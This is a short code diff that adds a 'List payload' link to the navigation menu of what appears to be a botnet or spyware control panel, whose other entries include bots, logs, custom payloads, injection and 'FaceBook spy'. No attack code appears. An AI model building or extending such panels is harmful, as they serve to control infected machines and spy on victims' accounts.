@@ -17,6 +17,7 @@ if($select->rowCount() < 1){
       <a href="index.php?action=bots" class="item">Bots</a>
       <a href="index.php?action=panel" class="item">Logs</a>
       <a href="index.php?action=payload" class="item">Custom payload</a>
+      <a href="index.php?action=listpayload" class="item">List payload</a>
       <a href="index.php?action=inject" class="active item">FaceBook spy</a>
       <a href="logout.php" class="item">Logout</a>
       <div class="right menu">
